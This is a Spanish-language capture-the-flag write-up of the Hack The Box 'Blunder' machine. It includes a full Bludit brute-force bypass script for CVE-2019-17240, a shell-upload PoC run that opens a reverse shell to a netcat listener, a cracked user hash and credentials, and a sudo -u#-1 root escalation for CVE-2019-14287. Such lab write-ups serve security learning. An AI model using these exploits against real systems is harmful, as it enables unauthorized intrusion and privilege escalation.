---
tags:
title: Blunder - Easy (HTB)
permalink: /Blunder-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sS -p- --open --min-rate 5000 -n -vvv 10.129.95.225 -oG allPorts -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-16 15:01 -0300
Initiating SYN Stealth Scan at 15:01
Scanning 10.129.95.225 [65535 ports]
Discovered open port 80/tcp on 10.129.95.225
Completed SYN Stealth Scan at 15:02, 27.31s elapsed (65535 total ports)
Nmap scan report for 10.129.95.225
Host is up, received user-set (0.46s latency).
Scanned at 2026-01-16 15:01:38 -03 for 28s
Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.39 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 163 (29.416KB)
```

## Website

El sitio principal no muestra mucho.

![image-center](/assets/images/Pasted image 20260116150214.png)

### Gobuster enumeration

Sin embargo con el escaneo de `gobuster` encontré algunas rutas nuevas.

```bash
gobuster dir -u http://blunder.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt  -t 200  -x txt,php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blunder.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
about                (Status: 200) [Size: 3290]
0                    (Status: 200) [Size: 7573]
admin                (Status: 301) [Size: 0] [--> http://10.129.95.225/admin/]
install.php          (Status: 200) [Size: 30]
robots.txt           (Status: 200) [Size: 22]
todo.txt             (Status: 200) [Size: 118]
usb                  (Status: 200) [Size: 3969]
LICENSE              (Status: 200) [Size: 1083]
Progress: 13211 / 661674 (2.00%)
```
### Admin panel

En la ruta `/admin` veo un panel, que sin credenciales no puedo hacer mucho aca.

![image-center](/assets/images/Pasted image 20260116150456.png)
## Shell as fergus 
### Leak user

En el archivo `todo.txt` se filtra el nombre de un usuario que posiblemente sea valido.

![image-center](/assets/images/Pasted image 20260116151735.png)

### Brute force - CVE-2019-17240

Como se que corre `bludit` se que existe una vulnerabilidad catalogada como `CVE-2019-17240`, el cual permite un `Brute force` para descubrir la password de un usuario en el panel de login.

Para crear un lista personalizada antes de jugar con algún diccionario como `rockyou` que es muy largo, use `cewl` para crear una lista de passwords con las palabras claves del sitio principal

```bash
cewl http://blunder.htb -w passwords.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

Luego para hacer el ataque use el siguiente script.

```python
#!/usr/bin/python3

# Exploit
## Title: Bludit <= 3.9.2 - Bruteforce Mitigation Bypass
## Author: ColdFusionX (Mayank Deshmukh)
## Author website: https://coldfusionx.github.io
## Date: 2020-10-19
## Vendor Homepage: https://www.bludit.com/
## Software Link: https://github.com/bludit/bludit/archive/3.9.2.tar.gz
## Version: <= 3.9.2

# Vulnerability
## Discoverer: Rastating
## Discoverer website: https://rastating.github.io/
## CVE: CVE-2019-17240 https://nvd.nist.gov/vuln/detail/CVE-2019-17240
## References: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
## Patch: https://github.com/bludit/bludit/pull/1090

'''
Example Usage:
- ./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
'''

import requests
import sys
import re
import argparse, textwrap
from pwn import *

#Expected Arguments
parser = argparse.ArgumentParser(description="Bludit <= 3.9.2 Auth Bruteforce Mitigation Bypass", formatter_class=argparse.RawTextHelpFormatter,
epilog=textwrap.dedent('''
Exploit Usage :
./exploit.py -l http://127.0.0.1/admin/login.php -u user.txt -p pass.txt
./exploit.py -l http://127.0.0.1/admin/login.php -u /Directory/user.txt -p /Directory/pass.txt'''))

parser.add_argument("-l","--url", help="Path to Bludit (Example: http://127.0.0.1/admin/login.php)")
parser.add_argument("-u","--userlist", help="Username Dictionary")
parser.add_argument("-p","--passlist", help="Password Dictionary")
args = parser.parse_args()

if len(sys.argv) < 2:
    print (f"Exploit Usage: ./exploit.py -h [help] -l [url] -u [user.txt] -p [pass.txt]")
    sys.exit(1)

# Variable
LoginPage = args.url
Username_list = args.userlist
Password_list = args.passlist

log.info('Bludit Auth BF Mitigation Bypass Script by ColdFusionX \n ')

def login(Username,Password):
    session = requests.session()
    r = session.get(LoginPage)

# Progress Check
    process = log.progress('Brute Force')

#Getting CSRF token value
    CSRF = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)
    CSRF = CSRF.group(1)

#Specifying Headers Value
    headerscontent = {
    'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Referer' : f"{LoginPage}",
    'X-Forwarded-For' : f"{Password}"
    }

#POST REQ data
    postreqcontent = {
    'tokenCSRF' : f"{CSRF}",
    'username' : f"{Username}",
    'password' : f"{Password}"
    }

#Sending POST REQ
    r = session.post(LoginPage, data = postreqcontent, headers = headerscontent, allow_redirects= False)

#Printing Username:Password
    process.status('Testing -> {U}:{P}'.format(U = Username, P = Password))

#Conditional loops
    if 'Location' in r.headers:
        if "/admin/dashboard" in r.headers['Location']:
            print()
            log.info(f'SUCCESS !!')
            log.success(f"Use Credential -> {Username}:{Password}")
            sys.exit(0)
    elif "has been blocked" in r.text:
        log.failure(f"{Password} - Word BLOCKED")

#Reading User.txt & Pass.txt files
userfile = open(Username_list).readlines()
for Username in userfile:
    Username = Username.strip()

passfile = open(Password_list).readlines()
for Password in passfile:
    Password = Password.strip()
    login(Username,Password)
```

### Auth 

Después de correrlo y esperar unos minutos tengo la password del usuario `fergus`.

```bash
python3 exploit.py -l http://blunder.htb/admin/login.php -u users -p passwords.txt
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX 
     
[q] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain

```

Me logueo.

![image-center](/assets/images/Pasted image 20260116152335.png)
### Auth as hugo

Para esta misma versión `(3.9.2)` también existe un `PoC` para obtener una ejecucion remota de comandos, la cual [encontre en este repositori](https://github.com/hg8/CVE-2019-16113-PoC)o de Github.

La cual luego de ejecutarlo cambiando los datos a mi `ip`  `puerto`, envía el `payload`.

```bash
python3 CVE-2019-16113.py   
[+] Loggin successful.
[+] Token CSRF: dfc0131a11ec2bd428aa13bad315ac8d78b37ca0
[+] Shell upload succesful.
[+] .htaccess upload succesful.
[+] Command Execution Successful.
```

Y luego de su ejecución recibo la shell como el usuario `fergus`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.95.225] 35356
bash: cannot set terminal process group (1261): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ script /dev/null -c bash 
<dit-3.9.2/bl-content/tmp$ script /dev/null -c bash    
Script started, file is /dev/null
```

En el directorio `/var/www/bludit-3.10.0a/bl-content/databases`, encontré un archivo , con credenciales para el usuario `hugo`.

```bash
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}

```

Como su password esta hasheada en `sha1` use la pagina de `CrackStation` para romper el hash.

![image-center](/assets/images/Pasted image 20260116160742.png)

`hugo:Password120`

Para migrar a dicho usuario use `su hugo`.

```bash
hugo@blunder:~$ cat user.txt 
1a01df70cbae599822041fbc4d8f9d3e
```
## Shell as root

### Sudo rights

Viendo los privilegios que tiene este usuario con `sudo` veo que puede ejecutar `/bin/bash` como cualquier usuario, menos como `root`.

```bash
hugo@blunder:~$ sudo -l
Password: 
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
### CVE-2019-14287
Esto se conoce como `CVE-2019-14287`, una vulnerabilidad de bypass en `sudo` que te permite ejecutar comandos como root a pesar de la restricción `!root`.

Las versiones de `Sudo` < 1.8.28 tienen un bug: si especificás el UID `-1` o `4294967295`, sudo lo interpreta como UID 0 (root), bypaseando la restricción `!root`

Así que como se puede ver si cualquiera de ambos `UID` me da una shell como `root`.

```bash
hugo@blunder:~$ sudo /bin/bash
Sorry, user hugo is not allowed to execute '/bin/bash' as root on blunder.
hugo@blunder:~$ sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
root
```

```bash
hugo@blunder:~$ sudo -u#4294967295 /bin/bash
root@blunder:/home/hugo# id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
```

```bash
root@blunder:/home/hugo# cat /root/root.txt 
6f2b2eecce0d471dc584495a90eb90c4
```

`~Happy Hacking.`

